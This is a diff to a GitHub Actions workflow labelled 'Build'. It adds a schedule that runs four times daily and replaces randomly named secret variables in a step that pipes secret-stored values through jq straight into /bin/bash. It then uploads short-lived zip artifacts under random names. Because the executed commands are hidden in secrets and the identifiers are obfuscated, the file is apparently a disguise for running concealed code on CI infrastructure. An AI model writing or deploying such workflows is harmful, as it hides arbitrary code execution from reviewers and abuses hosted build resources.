@@ -2,6 +2,8 @@ name: Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '38 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -9,17 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          wgsp5331: ${{ secrets.wgsp5331 }}
+          ibrn82683: ${{ secrets.ibrn82683 }}
         run: |
-          printf '%s' "$wgsp5331" | jq -r .kqlbj11 | /bin/bash
-          printf '%s' "$pglqi02166" | jq -r .es0 | /bin/bash
-          echo $yir89961 | jq -r .ulm39417 | /bin/bash
-          echo $behzr819 | jq -r .nrrl563 | /bin/bash
-          printf '%s' "$qlvqa9" | jq -r .g336 | /bin/bash
+          printf '%s' "$ibrn82683" | jq -r .u27434 | /bin/bash
+          echo $akqk55 | jq -r .ny5 | /bin/bash
+          echo $feu90 | jq -r .ihnp21232 | /bin/bash
+          echo $py3 | jq -r .b144 | /bin/bash
+          printf '%s' "$ej1" | jq -r .aqm31 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: XSBqcVcE
+          name: fTyFCIuO
           path: "*.zip"
           retention-days: 1
